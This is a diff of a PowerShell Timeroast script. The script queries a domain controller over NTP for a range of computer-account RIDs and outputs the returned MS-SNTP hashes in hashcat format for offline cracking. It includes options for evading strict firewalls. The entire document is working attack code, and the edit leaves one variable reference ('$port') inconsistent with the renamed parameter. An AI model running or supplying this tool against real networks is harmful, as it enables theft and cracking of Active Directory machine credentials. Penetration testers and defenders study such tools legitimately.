@@ -19,14 +19,16 @@
 .PARAMETER outputFile
     Hash output file. Writes to stdout if omitted.
 
-.PARAMETER relativeIds
-    Comma-separated list of RIDs to try. Use hypens to specify
-    (inclusive) ranges, e.g. "512-800,600-1400". By default, all
-    possible RIDs will be tried until timeout.
+.PARAMETER minRID
+    First RID to try. Useful to continue after an earlier partial Timeroast. Default is 0.
+    
+.PARAMETER maxRID
+    The highest RID to try. By default there is no limit other than the maximal possible RID. 
+    Regardless of whether this is set, the script will only terminate after no response has come in for TIMEOUT seconds.
 
 .PARAMETER rate
     NP queries to execute second per second. Higher is faster, but
-    with a greater risk of dropper datagrams, resulting in possibly
+    with a greater risk of dropped datagrams, resulting in possibly
     incomplete results. Default: 180.
 
 .PARAMETER timeout
@@ -38,7 +40,7 @@
     Obtain hashes of the previous computer password instead of the
     current one.
 
-.PARAMETER port
+.PARAMETER sourcePort
     NTP source port to use. A dynamic unprivileged port is chosen by default.
     Could be set to 123 to get around a strict firewall.
 
@@ -51,29 +53,45 @@ param(
     [string]$domainController,
 
     [string]$outputFile,
-    [string]$relativeIDs,
+    [Uint]$minRID = 0,
+    [Uint]$maxRID = 2147483648,
     [Uint]$rate = 180,
     [Uint]$timeout = 24,
     [switch]$oldHashes,
-    [Uint16]$port
+    [Uint16]$sourcePort
 )
+
+$ErrorActionPreference = "Stop"
 
 $NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)
 
-$keyFlag = $oldHashes ? [Math]::Ceiling([Math]::Pow(2,31)) : 0
-$results = @{} # Dictionary
+$keyFlag = $oldHashes ? 2147483648 : 0
 
-for ($rid = 999; $rid -le 1500; $rid++) {
-    if ($port -eq 0) {
-        $client = New-Object System.Net.Sockets.UdpClient
-    } else {
-        $client = New-Object System.Net.Sockets.UdpClient($port)
-    }
-    $client.Client.ReceiveTimeout = 1000/$rate
-    $client.Connect($domainController, 123)
-    $query = $NTP_PREFIX + [BitConverter]::GetBytes(($rid -bxor $keyFlag)) + [byte[]]::new(16)
-    [void] $client.Send($query, $query.Length)
+if ($outputFile) {
+    Out-Null > $outputFile
+}
+
+# Only a subset of queries gets a response. Alternate between sending and receiving and use the request rate as receive
+# timeout. If the DC is slower to respond than this rate that is fine. The response contains the RID it is associated 
+# with so the sender is allowed to be ahead of the receiver.
+if ($port -eq 0) {
+    $client = New-Object System.Net.Sockets.UdpClient
+} else {
+    $client = New-Object System.Net.Sockets.UdpClient($sourcePort)
+}
+$client.Client.ReceiveTimeout = [Math]::floor(1000/$rate)
+$client.Connect($domainController, 123)
+
+$timeoutTime = (Get-Date).AddSeconds($timeout)
+for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {   
     
+    # Request as long as the maximal RID hasn't been reached yet.
+    if ($queryRid -le $maxRID) {
+        $query = $NTP_PREFIX + [BitConverter]::GetBytes([Uint]($queryRid -bxor $keyFlag)) + [byte[]]::new(16)
+        [void] $client.Send($query, $query.Length)
+    }
+    
+    # Keep receiving responses until the total timeout.    
     try {
         $reply = $client.Receive([ref]$null)
         
@@ -82,30 +100,22 @@ for ($rid = 999; $rid -le 1500; $rid++) {
             $md5Hash = [byte[]]$reply[-16..-1]
             $answerRid = ([BitConverter]::ToUInt32($reply[-20..-16], 0) -bxor $keyFlag)
             
-            if($results.ContainsValue($answerRid)) {
-                continue
+            $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
+            $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
+            $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $answerRid, $hexMd5Hash, $hexSalt
+            if ($outputFile) {
+                $hashcatHash | Out-File -Append -FilePath $outputFile
+            } else {
+                Write-Host $hashcatHash
             }
-            $results[$answerRid] = [ValueTuple]::Create($salt, $md5Hash)
+            
+            # Succesfull receive. Update total timeout.
+            $timeoutTime = (Get-Date).AddSeconds($timeout)
        }   
     }
     catch [System.Management.Automation.MethodInvocationException] {
-        # No response, timed-out
-    }
-    finally {
-        $client.Close()
+        # Time for next request.
     }
 }
 
-foreach($rid in $results.Keys) {
-    $salt = $results[$rid][0]
-    $md5Hash = $results[$rid][1]
-    $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
-    $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
-    $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $rid, $hexSalt, $hexMd5Hash
-    if ($outputFile) {
-        Clear-Content $outputFile
-        $hashcatHash | Out-File -Append -FilePath $outputFile
-    } else {
-        Write-Host $hashcatHash
-    }
-}
+$client.Close()
